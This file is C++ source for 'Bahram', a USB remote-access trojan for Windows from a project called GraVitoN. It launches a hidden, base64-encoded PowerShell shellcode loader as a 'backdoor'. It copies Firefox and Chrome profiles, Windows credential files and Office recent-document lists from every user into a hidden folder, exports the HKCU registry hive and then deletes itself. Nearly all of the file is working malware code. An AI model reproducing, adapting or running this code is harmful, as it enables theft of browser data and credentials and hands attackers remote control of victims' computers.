/**
 * @file
 * @author  Sina Hatef Matbue ( _null_ ) <sinahatef.cpp@gmail.com>
 *
 * @section License
 *
 * This file is part of GraVitoN.
 *
 * Graviton is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * Graviton is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with Graviton.  If not, see http://www.gnu.org/licenses/.
 *
 * @brief Bahram: A USB RAT for Windows OSs
 *
 */

// @todo: Add modules used here to Malkit, Utils and Payload classes
// @todo: Meterpreter Reverse HTTPS powershell payload

#define INITGUID

#include <windows.h>
#include <strsafe.h>
#include <direct.h>
#include <string.h>

#include <Lmcons.h>
#include <shobjidl.h>
#include <shlguid.h>
#include <strsafe.h>
HRESULT ResolveIt(HWND, LPCSTR, LPWSTR, int);

#include <vector>
#include <string>
using namespace std;

#include "bahram.hpp"

void runOrphanProc(string cmd)
{
	PROCESS_INFORMATION processInformation;
    STARTUPINFO startupInfo;
    memset(&processInformation, 0, sizeof(processInformation));
    memset(&startupInfo, 0, sizeof(startupInfo));
    startupInfo.cb = sizeof(startupInfo);
    LPTSTR szCmdline = new char[cmd.size()+2];
    
	memcpy(szCmdline, cmd.c_str(), cmd.size() + 1);
	CreateProcess(
		NULL, szCmdline, NULL, NULL,
		FALSE, CREATE_NO_WINDOW,  // NORMAL_PRIORITY_CLASS vs CREATE_NO_WINDOW
		NULL, NULL,
		&startupInfo, &processInformation);
}

void whoIsInCharge()
{
	char username[UNLEN+1];
	DWORD username_len = UNLEN+1;
	GetUserName(username, &username_len);
	
	uname = username;
	
	sayshit(uname+" is in charge!");
}

void activeRecon()
{
	// IPCONFIG
	string ipconfig = "/C ipconfig > \"" + darkwd + "ipconfig.txt\"";
	sayshit(ipconfig);
	ShellExecute(0, "open", "cmd.exe", ipconfig.c_str(), 0, SW_HIDE);
	
	// REG DUMP
	string dumpCUS = "/C reg.exe export \"HKCU\\Software\" \"" + darkwd + "hkcu_software.reg\" /y";
	sayshit(dumpCUS);
	ShellExecute(0, "open", "cmd.exe", dumpCUS.c_str(), 0, SW_HIDE);
	//string dumpLMS = "/C reg.exe export \"HKLM\\Software\" \"" + darkwd + "hklm_software.reg\" /y";
	//sayshit(dumpLMS);
	//ShellExecute(0, "open", "cmd.exe", dumpLMS.c_str(), 0, SW_HIDE);
}

void masterCopy(vector<GraVitoN::Utils::File> subfiles, string dst)
{
	GraVitoN::Utils::Directory dd(dst);
	if( !dd.exists() )
		dd.create();
		
	for(int j=0; j<subfiles.size(); ++j)
	{
		sayshit(subfiles[j].extension() + " name: " + subfiles[j].name());
		if( subfiles[j].extension() == "lnk" )
		{
			sayshit("Following " + subfiles[j].getPath());
			
			WCHAR res[1024];
			HRESULT hres = ResolveIt(_null_, subfiles[j].getPath().c_str(), res, 1023);
			
			if(SUCCEEDED(hres))
			{
				sayshit((char*)res);
				
				string name, orig_nm = subfiles[j].name();
				for(int s=0; s<orig_nm.size()-4; ++s)
				{
					name = name + orig_nm[s];
				}
				sayshit("Copying lnk to " + (dst + "\\" + name));
				CopyFile((LPCSTR)res, (dst + "\\" + name).c_str(), FALSE);
			}
		}
		else
		{
			CopyFile(subfiles[j].getPath().c_str(), (dst + "\\" + subfiles[j].name()).c_str(), FALSE);
		}
	}
}

void huntFirefox()
{
	GraVitoN::Utils::Directory firefucks("C:\\Users\\" + current_user + "\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\");
	
	vector<GraVitoN::Utils::Directory> profs, subprof;
	vector<GraVitoN::Utils::File> subfiles;
	
	if (firefucks.list(profs, subfiles))
	{
		
		string fox = darkwd + "\\" + current_user + "\\firefox\\";
		GraVitoN::Utils::Directory foxd(fox);
		foxd.create();
		
		sayshit("Going after foxybitch...");
		
		for(char i='0'; i<profs.size() + '0'; ++i)
		{
			sayshit("    dumping firefox profile:" + profs[i-'0'].getPath());
			profs[i-'0'].list(subprof, subfiles);
			
			masterCopy(subfiles, fox + i);
		}
	}
	else
	{
		sayshit("Foxybitch is not there [period]");
	}
}

void huntChrome()
{
	GraVitoN::Utils::Directory chromefuckstoo("C:\\Users\\" + current_user + "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\");
	
	vector<GraVitoN::Utils::Directory> profs;
	vector<GraVitoN::Utils::File> subfiles;
	
	
	if (chromefuckstoo.list(profs, subfiles))
	{
		sayshit("Going after chromehole...");
		
		sayshit("    dumping chrome default profile:" + chromefuckstoo.getPath());
		masterCopy(subfiles, darkwd + "\\" + current_user + "\\chrome\\");
	}
	else
	{
		sayshit("Where is my goddamn chrome?!");
	}
}

void huntOffice()
{
	GraVitoN::Utils::Directory microsucks("C:\\Users\\" + current_user + "\\AppData\\Roaming\\Microsoft\\Credentials\\");
	
	vector<GraVitoN::Utils::Directory> profs;
	vector<GraVitoN::Utils::File> subfiles;
	
	
	if (microsucks.list(profs, subfiles))
	{
		sayshit("Going after microsucksoffice...");
		
		sayshit("    dumping creds:" + microsucks.getPath());
		masterCopy(subfiles, darkwd + "\\" + current_user + "\\office\\");
	}
	else
	{
		sayshit("Empty office? Let's fuck then!");
	}
}

void huntRecentDocs()
{
	// C:\Users\Administrator\AppData\Roaming\Microsoft\Office\Recent
	GraVitoN::Utils::Directory mru("C:\\Users\\" + current_user + "\\AppData\\Roaming\\Microsoft\\Office\\Recent");
	
	vector<GraVitoN::Utils::Directory> profs;
	vector<GraVitoN::Utils::File> subfiles;
	
	
	if (mru.list(profs, subfiles))
	{
		sayshit("Going after MRU...");
		
		sayshit("    dumping most recent used files (MRU): " + mru.getPath());
		masterCopy(subfiles, darkwd + "\\" + current_user + "\\MRU\\");
	}
	else
	{
		sayshit("Target is super lazy!");
	}
}

void createDarkDir()
{
	darkwd = cwd + DARK_PATH + "\\" + uname + "\\";
	GraVitoN::Utils::Directory dwd(darkwd);
	dwd.create();
	sayshit("Dark path: " + darkwd);
	
	ShellExecute(0, "open", "cmd.exe", ("/C attrib +h +s \"" + darkwd + "\"").c_str(), 0, SW_HIDE);
}

void runTarget()
{    
    for(char c=0; c<SP_SIZE; ++c)
    {
    	string tdd = search_path[c] + TARGET_EXEC;
    	GraVitoN::Utils::File exec(tdd);
    	
    	sayshit("Using " + tdd);
    	
    	if(exec.exists())
    	{
    		tdd = tdd + " \"" + cwd + "\\" + DARK_PATH + "\\" + TARGET + "\"";
    		sayshit("Executing " + tdd);
    		runOrphanProc(tdd);
		}
		else
		{
			sayshit("    Not there.");
		}
	}
	
	sayshit("Mayday...");
}

void backdoor()
{
	sayshit("Backdooring target system using POWERSHELL...");
	string backdoor = "cmd.exe /C powershell.exe -nop -win hidden -noni -enc JAAxACAAPQAgACcAJABjACAAPQAgACcAJwBbAEQAbABsAEkAbQBwAG8AcgB0ACgAIgBrAGUAcgBuAGUAbAAzADIALgBkAGwAbAAiACkAXQBwAHUAYgBsAGkAYwAgAHMAdABhAHQAaQBjACAAZQB4AHQAZQByAG4AIABJAG4AdABQAHQAcgAgAFYAaQByAHQAdQBhAGwAQQBsAGwAbwBjACgASQBuAHQAUAB0AHIAIABsAHAAQQBkAGQAcgBlAHMAcwAsACAAdQBpAG4AdAAgAGQAdwBTAGkAegBlACwAIAB1AGkAbgB0ACAAZgBsAEEAbABsAG8AYwBhAHQAaQBvAG4AVAB5AHAAZQAsACAAdQBpAG4AdAAgAGYAbABQAHIAbwB0AGUAYwB0ACkAOwBbAEQAbABsAEkAbQBwAG8AcgB0ACgAIgBrAGUAcgBuAGUAbAAzADIALgBkAGwAbAAiACkAXQBwAHUAYgBsAGkAYwAgAHMAdABhAHQAaQBjACAAZQB4AHQAZQByAG4AIABJAG4AdABQAHQAcgAgAEMAcgBlAGEAdABlAFQAaAByAGUAYQBkACgASQBuAHQAUAB0AHIAIABsAHAAVABoAHIAZQBhAGQAQQB0AHQAcgBpAGIAdQB0AGUAcwAsACAAdQBpAG4AdAAgAGQAdwBTAHQAYQBjAGsAUwBpAHoAZQAsACAASQBuAHQAUAB0AHIAIABsAHAAUwB0AGEAcgB0AEEAZABkAHIAZQBzAHMALAAgAEkAbgB0AFAAdAByACAAbABwAFAAYQByAGEAbQBlAHQAZQByACwAIAB1AGkAbgB0ACAAZAB3AEMAcgBlAGEAdABpAG8AbgBGAGwAYQBnAHMALAAgAEkAbgB0AFAAdAByACAAbABwAFQAaAByAGUAYQBkAEkAZAApADsAWwBEAGwAbABJAG0AcABvAHIAdAAoACIAbQBzAHYAYwByAHQALgBkAGwAbAAiACkAXQBwAHUAYgBsAGkAYwAgAHMAdABhAHQAaQBjACAAZQB4AHQAZQByAG4AIABJAG4AdABQAHQAcgAgAG0AZQBtAHMAZQB0ACgASQBuAHQAUAB0AHIAIABkAGUAcwB0ACwAIAB1AGkAbgB0ACAAcwByAGMALAAgAHUAaQBuAHQAIABjAG8AdQBuAHQAKQA7ACcAJwA7ACQAdwAgAD0AIABBAGQAZAAtAFQAeQBwAGUAIAAtAG0AZQBtAGIAZQByAEQAZQBmAGkAbgBpAHQAaQBvAG4AIAAkAGMAIAAtAE4AYQBtAGUAIAAiAFcAaQBuADMAMgAiACAALQBuAGEAbQBlAHMAcABhAGMAZQAgAFcAaQBuADMAMgBGAHUAbgBjAHQAaQBvAG4AcwAgAC0AcABhAHMAcwB0AGgAcgB1ADsAWwBCAHkAdABlAFsAXQBdADsAWwBCAHkAdABlAFsAXQBdACQAegAgAD0AIAAwAHgAZgBjACwAMAB4AGUAOAAsADAAeAA4ADkALAAwAHgAMAAwACwAMAB4ADAAMAAsADAAeAAwADAALAAwAHgANgAwACwAMAB4ADgAOQAsADAAeABlADUALAAwAHgAMwAxACwAMAB4AGQAMgAsADAAeAA2ADQALAAwAHgAOABiACwAMAB4ADUAMgAsADAAeAAzADAALAAwAHgAOABiACwAMAB4ADUAMgAsADAAeAAwAGMALAAwAHgAOABiACwAMAB4ADUAMgAsADAAeAAxADQALAAwAHgAOABiACwAMAB4ADcAMgAsADAAeAAyADgALAAwAHgAMABmACwAMAB4AGIANwAsADAAeAA0AGEALAAwAHgAMgA2ACwAMAB4ADMAMQAsADAAeABmAGYALAAwAHgAMwAxACwAMAB4AGMAMAAsADAAeABhAGMALAAwAHgAMwBjACwAMAB4ADYAMQAsADAAeAA3AGMALAAwAHgAMAAyACwAMAB4ADIAYwAsADAAeAAyADAALAAwAHgAYwAxACwAMAB4AGMAZgAsADAAeAAwAGQALAAwAHgAMAAxACwAMAB4AGMANwAsADAAeABlADIALAAwAHgAZgAwACwAMAB4ADUAMgAsADAAeAA1ADcALAAwAHgAOABiACwAMAB4ADUAMgAsADAAeAAxADAALAAwAHgAOABiACwAMAB4ADQAMgAsADAAeAAzAGMALAAwAHgAMAAxACwAMAB4AGQAMAAsADAAeAA4AGIALAAwAHgANAAwACwAMAB4ADcAOAAsADAAeAA4ADUALAAwAHgAYwAwACwAMAB4ADcANAAsADAAeAA0AGEALAAwAHgAMAAxACwAMAB4AGQAMAAsADAAeAA1ADAALAAwAHgAOABiACwAMAB4ADQAOAAsADAAeAAxADgALAAwAHgAOABiACwAMAB4ADUAOAAsADAAeAAyADAALAAwAHgAMAAxACwAMAB4AGQAMwAsADAAeABlADMALAAwAHgAMwBjACwAMAB4ADQAOQAsADAAeAA4AGIALAAwAHgAMwA0ACwAMAB4ADgAYgAsADAAeAAwADEALAAwAHgAZAA2ACwAMAB4ADMAMQAsADAAeABmAGYALAAwAHgAMwAxACwAMAB4AGMAMAAsADAAeABhAGMALAAwAHgAYwAxACwAMAB4AGMAZgAsADAAeAAwAGQALAAwAHgAMAAxACwAMAB4AGMANwAsADAAeAAzADgALAAwAHgAZQAwACwAMAB4ADcANQAsADAAeABmADQALAAwAHgAMAAzACwAMAB4ADcAZAAsADAAeABmADgALAAwAHgAMwBiACwAMAB4ADcAZAAsADAAeAAyADQALAAwAHgANwA1ACwAMAB4AGUAMgAsADAAeAA1ADgALAAwAHgAOABiACwAMAB4ADUAOAAsADAAeAAyADQALAAwAHgAMAAxACwAMAB4AGQAMwAsADAAeAA2ADYALAAwAHgAOABiACwAMAB4ADAAYwAsADAAeAA0AGIALAAwAHgAOABiACwAMAB4ADUAOAAsADAAeAAxAGMALAAwAHgAMAAxACwAMAB4AGQAMwAsADAAeAA4AGIALAAwAHgAMAA0ACwAMAB4ADgAYgAsADAAeAAwADEALAAwAHgAZAAwACwAMAB4ADgAOQAsADAAeAA0ADQALAAwAHgAMgA0ACwAMAB4ADIANAAsADAAeAA1AGIALAAwAHgANQBiACwAMAB4ADYAMQAsADAAeAA1ADkALAAwAHgANQBhACwAMAB4ADUAMQAsADAAeABmAGYALAAwAHgAZQAwACwAMAB4ADUAOAAsADAAeAA1AGYALAAwAHgANQBhACwAMAB4ADgAYgAsADAAeAAxADIALAAwAHgAZQBiACwAMAB4ADgANgAsADAAeAA1AGQALAAwAHgANgA4ACwAMAB4ADMAMwAsADAAeAAzADIALAAwAHgAMAAwACwAMAB4ADAAMAAsADAAeAA2ADgALAAwAHgANwA3ACwAMAB4ADcAMwAsADAAeAAzADIALAAwAHgANQBmACwAMAB4ADUANAAsADAAeAA2ADgALAAwAHgANABjACwAMAB4ADcANwAsADAAeAAyADYALAAwAHgAMAA3ACwAMAB4AGYAZgAsADAAeABkADUALAAwAHgAYgA4ACwAMAB4ADkAMAAsADAAeAAwADEALAAwAHgAMAAwACwAMAB4ADAAMAAsADAAeAAyADkALAAwAHgAYwA0ACwAMAB4ADUANAAsADAAeAA1ADAALAAwAHgANgA4ACwAMAB4ADIAOQAsADAAeAA4ADAALAAwAHgANgBiACwAMAB4ADAAMAAsADAAeABmAGYALAAwAHgAZAA1ACwAMAB4ADUAMAAsADAAeAA1ADAALAAwAHgANQAwACwAMAB4ADUAMAAsADAAeAA0ADAALAAwAHgANQAwACwAMAB4ADQAMAAsADAAeAA1ADAALAAwAHgANgA4ACwAMAB4AGUAYQAsADAAeAAwAGYALAAwAHgAZABmACwAMAB4AGUAMAAsADAAeABmAGYALAAwAHgAZAA1ACwAMAB4ADkANwAsADAAeAA2AGEALAAwAHgAMAA1ACwAMAB4ADYAOAAsADAAeABiADAALAAwAHgAMAA5ACwAMAB4ADcAZgAsADAAeAA4AGIALAAwAHgANgA4ACwAMAB4ADAAMgAsADAAeAAwADAALAAwAHgAMAAxACwAMAB4AGIAYgAsADAAeAA4ADkALAAwAHgAZQA2ACwAMAB4ADYAYQAsADAAeAAxADAALAAwAHgANQA2ACwAMAB4ADUANwAsADAAeAA2ADgALAAwAHgAOQA5ACwAMAB4AGEANQAsADAAeAA3ADQALAAwAHgANgAxACwAMAB4AGYAZgAsADAAeABkADUALAAwAHgAOAA1ACwAMAB4AGMAMAAsADAAeAA3ADQALAAwAHgAMABjACwAMAB4AGYAZgAsADAAeAA0AGUALAAwAHgAMAA4ACwAMAB4ADcANQAsADAAeABlAGMALAAwAHgANgA4ACwAMAB4AGYAMAAsADAAeABiADUALAAwAHgAYQAyACwAMAB4ADUANgAsADAAeABmAGYALAAwAHgAZAA1ACwAMAB4ADYAYQAsADAAeAAwADAALAAwAHgANgBhACwAMAB4ADAANAAsADAAeAA1ADYALAAwAHgANQA3ACwAMAB4ADYAOAAsADAAeAAwADIALAAwAHgAZAA5ACwAMAB4AGMAOAAsADAAeAA1AGYALAAwAHgAZgBmACwAMAB4AGQANQAsADAAeAA4AGIALAAwAHgAMwA2ACwAMAB4ADYAYQAsADAAeAA0ADAALAAwAHgANgA4ACwAMAB4ADAAMAAsADAAeAAxADAALAAwAHgAMAAwACwAMAB4ADAAMAAsADAAeAA1ADYALAAwAHgANgBhACwAMAB4ADAAMAAsADAAeAA2ADgALAAwAHgANQA4ACwAMAB4AGEANAAsADAAeAA1ADMALAAwAHgAZQA1ACwAMAB4AGYAZgAsADAAeABkADUALAAwAHgAOQAzACwAMAB4ADUAMwAsADAAeAA2AGEALAAwAHgAMAAwACwAMAB4ADUANgAsADAAeAA1ADMALAAwAHgANQA3ACwAMAB4ADYAOAAsADAAeAAwADIALAAwAHgAZAA5ACwAMAB4AGMAOAAsADAAeAA1AGYALAAwAHgAZgBmACwAMAB4AGQANQAsADAAeAAwADEALAAwAHgAYwAzACwAMAB4ADIAOQAsADAAeABjADYALAAwAHgAOAA1ACwAMAB4AGYANgAsADAAeAA3ADUALAAwAHgAZQBjACwAMAB4AGMAMwA7ACQAZwAgAD0AIAAwAHgAMQAwADAAMAA7AGkAZgAgACgAJAB6AC4ATABlAG4AZwB0AGgAIAAtAGcAdAAgADAAeAAxADAAMAAwACkAewAkAGcAIAA9ACAAJAB6AC4ATABlAG4AZwB0AGgAfQA7ACQAeAA9ACQAdwA6ADoAVgBpAHIAdAB1AGEAbABBAGwAbABvAGMAKAAwACwAMAB4ADEAMAAwADAALAAkAGcALAAwAHgANAAwACkAOwBmAG8AcgAgACgAJABpAD0AMAA7ACQAaQAgAC0AbABlACAAKAAkAHoALgBMAGUAbgBnAHQAaAAtADEAKQA7ACQAaQArACsAKQAgAHsAJAB3ADoAOgBtAGUAbQBzAGUAdAAoAFsASQBuAHQAUAB0AHIAXQAoACQAeAAuAFQAbwBJAG4AdAAzADIAKAApACsAJABpACkALAAgACQAegBbACQAaQBdACwAIAAxACkAfQA7ACQAdwA6ADoAQwByAGUAYQB0AGUAVABoAHIAZQBhAGQAKAAwACwAMAAsACQAeAAsADAALAAwACwAMAApADsAZgBvAHIAIAAoADsAOwApAHsAUwB0AGEAcgB0AC0AcwBsAGUAZQBwACAANgAwAH0AOwAnADsAJABlACAAPQAgAFsAUwB5AHMAdABlAG0ALgBDAG8AbgB2AGUAcgB0AF0AOgA6AFQAbwBCAGEAcwBlADYANABTAHQAcgBpAG4AZwAoAFsAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4ARQBuAGMAbwBkAGkAbgBnAF0AOgA6AFUAbgBpAGMAbwBkAGUALgBHAGUAdABCAHkAdABlAHMAKAAkADEAKQApADsAJAAyACAAPQAgACIALQBlAG4AYwAgACIAOwBpAGYAKABbAEkAbgB0AFAAdAByAF0AOgA6AFMAaQB6AGUAIAAtAGUAcQAgADgAKQB7ACQAMwAgAD0AIAAkAGUAbgB2ADoAUwB5AHMAdABlAG0AUgBvAG8AdAAgACsAIAAiAFwAcwB5AHMAdwBvAHcANgA0AFwAVwBpAG4AZABvAHcAcwBQAG8AdwBlAHIAUwBoAGUAbABsAFwAdgAxAC4AMABcAHAAbwB3AGUAcgBzAGgAZQBsAGwAIgA7AGkAZQB4ACAAIgAmACAAJAAzACAAJAAyACAAJABlACIAfQBlAGwAcwBlAHsAOwBpAGUAeAAgACIAJgAgAHAAbwB3AGUAcgBzAGgAZQBsAGwAIAAkADIAIAAkAGUAIgA7AH0A";
	sayshit("    PAYLOAD: " + backdoor);
	runOrphanProc(backdoor);
	sayshit("She's up and running!");
}

string myPath()
{
	TCHAR buffer[MAX_PATH]={0};
	TCHAR * out;
	DWORD bufSize=sizeof(buffer)/sizeof(*buffer);
	GetModuleFileName(NULL, buffer, bufSize);
	sayshit("My name is " + string(buffer));
	return buffer;
}

void suicide()
{
	sayshit("Commiting suicide in 10 seconds...");
	
	string target   = " \"" + cwd + "\\" + DARK_PATH + "\\" + TARGET + "\"";
	string logfile  = " \"" + cwd + "\\" + GVN_LOG_FILE + "\"";
	string dst      = " \"" + cwd + "\\" + TARGET + "\"";
	string me       = " \"" + myPath() + "\"";
	
	string suic = 
		"cmd.exe /C echo 'Self-suicide activated' >> " + logfile + " & " +  
		"timeout 5 & " +
		"copy  /Y " + target + " " + dst + " & " +
		"del /F " + me + " & "
		"echo 'What is done, is done.' >> " + logfile;
		
	sayshit("    " + suic);
	
	runOrphanProc(suic);
	
	sayshit("She's up and running!");
}


int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
{
	sayshit("Bits, sharper than swords...");
	
	CoInitialize(_null_);
	
	backdoor();
	
	runTarget();
	
	whoIsInCharge();
	createDarkDir();
	
	activeRecon();
	
	vector<GraVitoN::Utils::Directory> users_folders;
	vector<GraVitoN::Utils::File> users_files;
	GraVitoN::Utils::Directory users_dir("C:\\Users");
	
	users_dir.list(users_folders, users_files);
	
	for(int i=0; i<users_folders.size(); ++i)
	{
		current_user = users_folders[i].name();
		
		darkwd = cwd + DARK_PATH + "\\" + uname + "\\";
		GraVitoN::Utils::Directory dwd(cwd + DARK_PATH + "\\" + uname + "\\" + current_user);
		dwd.create();
		sayshit("    Creating Path: " + dwd.getPath());
		
		huntFirefox();
		huntChrome();
		huntOffice();
	
		huntRecentDocs();
	}
	
	suicide();
	
	return EXIT_SUCCESS;
}

// Resolve a shortcut
// Source: https://msdn.microsoft.com/en-us/library/windows/desktop/bb776891%28v=vs.85%29.aspx
//
// ------> DO NOT FORGET TO CALL CoInitialize first
//
HRESULT ResolveIt(HWND hwnd, LPCSTR lpszLinkFile, LPWSTR lpszPath, int iPathBufferSize)
{ 
	IShellLink* psl; 
	
    HRESULT hres;
    WCHAR szGotPath[MAX_PATH]; 
    WCHAR szDescription[MAX_PATH]; 
    WIN32_FIND_DATA wfd; 
 
    *lpszPath = 0; // Assume failure 
 	
 	hres = CoCreateInstance(CLSID_ShellLink, NULL, CLSCTX_INPROC_SERVER, IID_IShellLink, (LPVOID*)&psl);
	if(SUCCEEDED(hres))
    {
		IPersistFile* ppf; 
	
	    // Get a pointer to the IPersistFile interface. 
	    hres = psl->QueryInterface(IID_IPersistFile, (void**)&ppf); 
	    
	    if (SUCCEEDED(hres)) 
	    { 
	        WCHAR wsz[MAX_PATH]; 
	
	        // Ensure that the string is Unicode. 
	        MultiByteToWideChar(CP_ACP, 0, lpszLinkFile, -1, wsz, MAX_PATH); 
	
	        // Add code here to check return value from MultiByteWideChar 
	        // for success.
	
	        // Load the shortcut. 
	        hres = ppf->Load(wsz, STGM_READ); 
	        
	        if (SUCCEEDED(hres)) 
	        { 
	            // Resolve the link. 
	            hres = psl->Resolve(hwnd, SLR_NO_UI); 
	
	            if (SUCCEEDED(hres)) 
	            { 
	                // Get the path to the link target. 
	                hres = psl->GetPath((LPSTR)szGotPath, MAX_PATH, (WIN32_FIND_DATA*)&wfd, SLGP_SHORTPATH); 
	
	                if (SUCCEEDED(hres)) 
	                { 
	                    // Get the description of the target. 
	                    hres = psl->GetDescription((LPSTR)szDescription, MAX_PATH); 
	
	                    if (SUCCEEDED(hres)) 
	                    {
	                        hres = StringCbCopy((STRSAFE_LPSTR)lpszPath, iPathBufferSize, (STRSAFE_LPSTR)szGotPath);
	                        if (SUCCEEDED(hres))
	                        {
	                            // Handle success
	                        }
	                        else
	                        {
	                            // Handle the error
	                        }
	                    }
	                }
	            } 
	        } 
	
	        // Release the pointer to the IPersistFile interface. 
	        ppf->Release(); 
	    } 
	
	    // Release the pointer to the IShellLink interface. 
	    psl->Release(); 
	}
    return hres; 
}
